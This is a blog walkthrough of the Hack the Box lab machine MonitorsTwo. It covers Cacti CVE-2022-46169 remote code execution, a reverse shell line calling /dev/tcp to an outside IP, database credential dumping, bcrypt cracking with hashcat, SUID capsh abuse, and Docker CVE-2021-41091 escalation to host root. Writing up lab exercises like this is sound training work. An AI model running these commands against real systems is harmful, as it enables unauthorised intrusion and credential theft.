---
title: MonitorsTwo (Hack the Box)
author: Robin Goyal
date: 2024-01-14
categories: [Cybersecurity, Writeups]
tags: []
image:
  src: https://labs.hackthebox.com/storage/avatars/b55987f8ef9a42df2ad4b4c096e3824d.png
---

![](/assets/img/htb-banner.png)

MonitorsTwo is an Easy Difficulty Linux machine showcasing a variety of vulnerabilities and misconfigurations. Initial enumeration exposes a web application prone to pre-authentication Remote Code Execution (RCE) through a malicious X-Forwarded-For header. Exploiting this vulnerability grants a shell within a Docker container. A misconfigured capsh binary with the SUID bit set allows for root access inside the container. Uncovering MySQL credentials enables the dumping of a hash, which, once cracked, provides SSH access to the machine. Further enumeration reveals a vulnerable Docker version ( CVE- 2021-41091 ) that permits a low-privileged user to access mounted container filesystems. Leveraging root access within the container, a bash binary with the SUID bit set is copied, resulting in privilege escalation on the host.[^htb-link]

<img src="{{ page.image.src }}" style="margin-right: 40px; margin-left: 20px; zoom: 50%;" align=left />    	

### {{ page.title }}

**Difficulty**: `easy`

**User Flag**: `56ae62d56114f8678da9072a0441142f`

**Root Flag**: `de560cbfa494ecbe13ac120973491c2b`

<br>
<hr>
<br>


## Enumeration

### nmap

Two open ports discovered in the initial full TCP scan: 22, 80.

```bash
$nmap -p 22,80 -sC -sV 10.129.228.231
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-13 19:49 EST
Nmap scan report for 10.129.228.231
Host is up (0.026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.58 seconds
```


## Initial Foothold

### CVE-2022-46169

The site's initial page is a Cacti application with version 1.2.2

![](/assets/img/posts/htb-monitorstwo/mt-cacti-login.png)

There is a public CVE for this version, CVE-2022-46169[^cve], which is vulnerable to an auth bypass and remote code execution. The exploit script will use a reverse shell payload so let's spin up a netcat listener.

![](/assets/img/posts/htb-monitorstwo/mt-cacti-exploit-revshell.png)

Upgrading the reverse shell[^upgrade-reverse-shell]:
- **Since python or python3 isn't available, there is another way to spawn /bin/bash with a pty.** `script -O /dev/null -c /bin/bash`. Once that completes, follow the rest of the steps to have a full pty. 

There isn't a lot of processes being displayed. It is possible that the proc filesystem has the `hidepid=2` option set or that we are inside a Docker container. 

```bash
www-data@50bca5e748b0:/var/www/html$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.6  80160 25416 ?        Ss   00:46   0:01 apache2 -DFOREGROUND
www-data      33  0.0  0.6  87116 24168 ?        S    00:46   0:00 apache2 -DFOREGROUND
www-data      34  0.0  0.6  86996 24272 ?        S    00:46   0:00 apache2 -DFOREGROUND
www-data      35  0.0  0.5  87124 24072 ?        S    00:46   0:00 apache2 -DFOREGROUND
www-data      36  0.0  0.6  87084 24420 ?        S    00:46   0:00 apache2 -DFOREGROUND
www-data      37  0.0  0.6  87116 24372 ?        S    00:46   0:00 apache2 -DFOREGROUND
www-data      38  0.0  0.6  87068 24476 ?        S    00:49   0:00 apache2 -DFOREGROUND
www-data      93  0.0  0.0   2476   576 ?        S    05:19   0:00 sh -c /usr/local/bin/php -q /var/www/html/script_server.php realtime ;bash -c 'bash -i >& /dev/tcp/10.10.14.3/5555 0>&1'
www-data      95  0.0  0.0   3892  2732 ?        S    05:19   0:00 bash -c bash -i >& /dev/tcp/10.10.14.3/5555 0>&1
www-data      96  0.0  0.0   4156  3444 ?        S    05:19   0:00 bash -i
www-data     304  0.0  0.0   6752  2960 ?        R    15:02   0:00 ps aux
```

### Docker

A few techniques to check if we are in a Docker container[^docker-breakout]. 
- hostname is randomly assigned 12 character string
- the presence of .dockerenv in /
- checking the cgroup process

```bash
www-data@50bca5e748b0:/var/www/html$ hostname
hostname
50bca5e748b0
www-data@50bca5e748b0:/var/www/html$ ls -la / | grep .dockerenv
ls -la / | grep .dockerenv
-rwxr-xr-x   1 root root    0 Mar 21  2023 .dockerenv
www-data@50bca5e748b0:/var/www/html$ cat /proc/1/cgroup
cat /proc/1/cgroup
12:freezer:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
11:devices:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
10:blkio:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
9:hugetlb:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
8:rdma:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
7:pids:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
6:cpuset:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
5:perf_event:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
4:memory:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
3:net_cls,net_prio:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
2:cpu,cpuacct:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
1:name=systemd:/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
0::/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
```

Next, we need to check if this is a privileged container. There is a few techniques here as well:
- listing the devices with the `fdisk` command since a non-privileged container would deny this command from being run
- check the seccomp value in the status process (0 for all fields indicates it is a privileged container)
- listing out the devices in /dev (a LOT means that it is a privileged container)

```bash
www-data@50bca5e748b0:/var/www/html$ fdisk -l
fdisk -l
bash: fdisk: command not found
www-data@50bca5e748b0:/var/www/html$ cat /proc/1/status | grep -i "seccomp"
cat /proc/1/status | grep -i "seccomp"
Seccomp:        2
www-data@50bca5e748b0:/var/www/html$ ls -l /dev | wc -l
ls -l /dev | wc -l
16
```

Looks like we are in a Docker container but it appears to not be a privileged container. 

Other than trying to breakout of the container, there might be interesting content in files on the container. 

*At this point, I got stuck and watched ippsec's videos to get an idea of how to proceed. The key to the next step is in the config file for the Cacti application.*

The root directory for the Cacti application is in /var/www/html. The configuration file with the information to connect to the MySQL database is in include/config.php

```bash
www-data@50bca5e748b0:/var/www/html$ cat include/config.php       
<?php                                                                                                                                        
--- SNIP ---                                      

$database_type     = 'mysql';                                         
$database_default  = 'cacti';                                         
$database_hostname = 'db';                                            
$database_username = 'root';                                          
$database_password = 'root';                                          
$database_port     = '3306';                                          
$database_retries  = 5;                                               
$database_ssl      = false;                                           
$database_ssl_key  = '';                                              
$database_ssl_cert = '';                                              
$database_ssl_ca   = '';                                              
$database_persist  = false; 

--- SNIP ---
```

The hostname db indicates that it might be another Docker container as part of the same docker network. The container doesn't have the nslookup, dig, or other name resolution tools but there is wget.

```bash
www-data@50bca5e748b0:/var/www/html$ wget db
--2024-01-14 17:42:05--  http://db/
Resolving db (db)... 172.19.0.2
Connecting to db (db)|172.19.0.2|:80... failed: Connection refused.
```

It is a MySQL server so I didn't expect it to successfully perform a wget but we see the IP associated to it. Let's connect to the MySQL server selecting the cacti database. 

```bash
www-data@50bca5e748b0:/var/www/html$ mysql -u root -proot -h db cacti
MySQL [cacti]>  show tables;
--- SNIP ---
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
111 rows in set (0.001 sec)
```

The table we most likely care about in this data is the user_auth table. 

```bash
MySQL [cacti]> show columns from user_auth;
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
| full_name              | varchar(100)          | YES  |     | 0       |                |
| email_address          | varchar(128)          | YES  |     | NULL    |                |
| must_change_password   | char(2)               | YES  |     | NULL    |                |
| password_change        | char(2)               | YES  |     | on      |                |
| show_tree              | char(2)               | YES  |     | on      |                |
| show_list              | char(2)               | YES  |     | on      |                |
| show_preview           | char(2)               | NO   |     | on      |                |
| graph_settings         | char(2)               | YES  |     | NULL    |                |
| login_opts             | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_graphs          | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_trees           | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_hosts           | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_graph_templates | tinyint(3) unsigned   | NO   |     | 1       |                |
| enabled                | char(2)               | NO   | MUL | on      |                |
| lastchange             | int(11)               | NO   |     | -1      |                |
| lastlogin              | int(11)               | NO   |     | -1      |                |
| password_history       | varchar(4096)         | NO   |     | -1      |                |
| locked                 | varchar(3)            | NO   |     |         |                |
| failed_attempts        | int(5)                | NO   |     | 0       |                |
| lastfail               | int(10) unsigned      | NO   |     | 0       |                |
| reset_perms            | int(10) unsigned      | NO   |     | 0       |                |
+------------------------+-----------------------+------+-----+---------+----------------+

MySQL [cacti]> select username,password,full_name,email_address from user_auth;
+----------+--------------------------------------------------------------+----------------+------------------------+
| username | password                                                     | full_name      | email_address          |
+----------+--------------------------------------------------------------+----------------+------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC | Jamie Thompson | admin@monitorstwo.htb  |
| guest    | 43e9a4ab75570f5b                                             | Guest Account  |                        |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C | Marcus Brune   | marcus@monitorstwo.htb |
+----------+--------------------------------------------------------------+----------------+------------------------+
```

Extracting out those password hashes excluding the guest hash and running hashcat in mode 3200 (bcrypt[^hashcat]).

```bash
$hashcat -a 0 -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt 
--- SNIP ---
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey
--- SNIP ---
```

I quit after a while as the hash for admin was taking too long. The password cracked is for the username marcus. Maybe there is credential reuse and we can SSH as marcus.

```bash
$ssh marcus@10.129.228.231
The authenticity of host '10.129.228.231 (10.129.228.231)' can't be established.
ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.231' (ECDSA) to the list of known hosts.
marcus@10.129.228.231's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 14 Jan 2024 05:47:01 PM UTC

  System load:                      0.44
  Usage of /:                       63.0% of 6.73GB
  Memory usage:                     17%
  Swap usage:                       0%
  Processes:                        236
  Users logged in:                  0
  IPv4 address for br-60ea49c21773: 172.18.0.1
  IPv4 address for br-7c3b7c0d00b3: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.228.231
  IPv6 address for eth0:            dead:beef::250:56ff:feb0:b550


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Thu Mar 23 10:12:28 2023 from 10.10.14.40
marcus@monitorstwo:~$ whoami
marcus
```

## Privilege Escalation

Looks like marcus has mail. 

```bash
marcus@monitorstwo:~$ cat /var/mail/marcus                                                                                                                                                                                                                                                
From: administrator@monitorstwo.htb                                                                                                                                                                                                                                                       
To: all@monitorstwo.htb                                                                                                                                                                                                                                                                   
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                          
Dear all,                                                                                                                                                                                                                                                                                 
                                                                                                                                            
We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.                                                                                                                                            
                                                                                                                                                                                                                                                                                          
CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later t
o address this vulnerability.                                                                                                                                                                                                                                                             
                                                                                                                                            
CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially result
ing in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.     
                                                                                                                                            
CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissio
ns. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.                                                     
                                                                                                                                                                                                                                                                                          
We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.                                                              
                                                                                                                                                                                                                                                                                          
Best regards,                                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                          
Administrator                                                                                                                                                                                                                                                                             
CISO                                                                                                                                                                                                                                                                                      
Monitor Two                                                                                                                                                                                                                                                                               
Security Team                      
```

The CVE affecting Moby looks interesting. Instead of launching the exploit script for that CVE on target[^cve-2021-41091], I'll analyze the exploit in the Summary of Exploits section below and use this example to escalate privileges to root.

In that section, I mentioned that we need root access from within the container. So how can we get that?

```bash
www-data@50bca5e748b0:/var/www/html$ find / -perm /4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/bash
/bin/su
```

/sbin/capsh is out of the usual from the ordinary list of binaries with the SUID bit set. GTFObins[^gtfobins] contains an entry for suid bit with capsh. 

```bash
www-data@50bca5e748b0:/var/www/html$ capsh --gid=0 --uid=- --      
root@50bca5e748b0:/var/www/html# whoami
root
```

Now that we are root, change the permissions of the bash binary.

```bash
root@50bca5e748b0:/var/www/html# chmod +s /bin/bash
```

Switch to the shell with marcus and find the data overlay that contains the modified bash binary.

```bash
marcus@monitorstwo:~$ findmnt | grep docker/overlay2 | awk '{ print $1 }'
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:~$ find /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged -name bash -ls 2>/dev/null
    24304    944 -rwxr-xr-x   1 root     root       964536 Nov 23  2021 /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/usr/bin/bash
marcus@monitorstwo:~$ find /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged -name bash -ls 2>/dev/null
    43825      4 drwxr-xr-x   2 root     root         4096 Mar 22  2023 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/usr/share/doc/bash
    46944      4 -rw-r--r--   1 root     root          194 Mar 27  2022 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/usr/share/menu/bash
    41766   1208 -rwsr-sr-x   1 root     root      1234376 Mar 27  2022 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash
```

The second data overlay directory contains the modified binary. 

```bash
marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p -i
bash-5.1# whoami
root
```


## Reflection

A reflection of what was learned throughout this box.

### Useful Commands

**MySQL: List contents of a single row well-formatted just for readability**: `select * from user_auth LIMIT 1 \G;`

**Capsh: Escalate privileges with SUID bit set**: `capsh --gid=0 --uid=0 --`

**Crack bcrypt hash ($2*$)**: `hashcat -a 0 -m 3200 hashes.txt wordlist.txt`

**Spawn a bash pty using script**: `script -O /dev/null -c /bin/bash`

### Killchain Summary

1. Take advantage of a vulnerability in Cacti to execute a payload landing a shell inside of the web applications docker container
2. Escalate privileges inside of the container through the misconfigured SUID bit set capsh binary  
3. Access the database server, dump the user_auth table, crack the bcrypt hashes, and crack marcus's password using hashcat
4. SSH to the target as marcus with the same cracked credentials in the user_auth table and read his mail on the server by the security team to identify a vulnerability in the Docker engine
5. Take advantage of the vulnerability by modifying the bash binary of the webapp container that we have root access with and add the SUID bit to /bin/bash
6. Find the mounted overlay directory for the webapp container and use the modified bash binary to escalate privileges on the host

### Misconfigurations

Some misconfigurations that led us to have root access.
- not patching vulnerabilities in software
- sending sensitive mail through the Linux mail utility and not an authenticated system
- reusing credentials for system access
- misconfigured binaries with the SUID bit set

### Summary of Exploits

#### CVE-2022-46169

Much of this CVE is covered and well explained with code snippets at https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/.

#### CVE-2021-41091

The vulnerability[^cve-2021-41091] affects Moby, an open-source project created by Docker for software containerization. This vulnerability can be exploited by executing programs on the data directories of the containers with insufficiently restricted permissions. Fixed in version 20.10.9 of the Docker Engine. 

If the user is able to view the mounts

```bash
marcus@monitorstwo:~$ findmnt | grep docker/overlay2 | awk '{ print $1 }'
├─/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
```

then from within the container, they can modify the permissions of a binary (for e.g. bash) and allow the user on the host to run the bash binary located in the data directory to escalate privileges. The requirement is that the user in the container is root or can become root to modify the permissions. 

**From the container**

```bash
root@container:/bin# chmod +s bash
```

**From the host**

Switch to the data directory that is specific to the container with root privileges.

```bash
marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin$ ./bash -p -i
bash-5.1# whoami
root
```

## Conclusion

The initial access vector was simple with an easy proof-of-concept script but the privesc vector with the mounted overlay directories was interesting and eye-opening on how it can be exploited. This box really required me to think (especially after caving and watching IPPSec's video) about how systems are administered using docker. 

## References

[^htb-link]: <https://app.hackthebox.com/machines/539>
[^cve]: <https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit>
[^cve-2022-46169]: <https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/>
[^upgrade-reverse-shell]: <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>
[^docker-breakout]: <https://juggernaut-sec.com/docker-breakout-lpe/#Confirming_we_are_in_a_Docker_Container>
[^hashcat]: <https://hashcat.net/wiki/doku.php?id=example_hashes>
[^cve-2021-41091]: <https://github.com/UncleJ4ck/CVE-2021-41091/blob/main/exp.sh>
[^gtfobins]: <https://gtfobins.github.io/gtfobins/capsh/>
